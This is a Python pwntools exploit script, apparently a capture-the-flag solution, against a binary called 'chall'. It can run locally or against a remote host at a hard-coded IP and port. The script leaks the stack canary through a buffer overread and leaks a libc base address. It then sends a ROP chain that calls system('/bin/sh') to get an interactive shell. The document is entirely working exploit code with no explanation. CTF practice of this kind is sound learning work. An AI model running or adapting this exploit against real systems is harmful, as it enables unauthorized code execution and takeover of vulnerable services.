#!/usr/bin/python3

from pwn import *

exe = ELF('chall', checksec=False)
libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")
context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                b*main+146

                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('45.153.243.57', 1337)
else:
        p = process(exe.path)

GDB()
sla(b'much???', b'1337')
sa(b'content', b'a' * 0x49)
p.recvuntil(b'a'*0x48)
canary = u64(p.recv(8).ljust(8, b'\0'))-0x61
print(hex(canary))
payload = b'a' * 0x48 + p64(canary+0x61) + b'b' * 8
sla(b'again?', '1337')
sla(b'much???', b'1337')
sa(b'content', payload)
p.recvuntil(b'b'*0x8)
libc.address = u64(p.recvline(keepends=False).ljust(8, b'\0')) - 0x29d90
print(hex(libc.address))

rop = ROP(libc)
payload = b'a' * 0x48 + p64(canary) + p64(0) +   p64(rop.find_gadget(['ret']).address)+p64(rop.find_gadget(['pop rdi', 'ret']).address)+flat(next(libc.search(b'/bin/sh\0')), libc.sym.system)
sla(b'again?', '1337')
sla(b'much???', b'1336')
sa(b'content', payload)
sla(b'again?', '1336')

p.interactive()
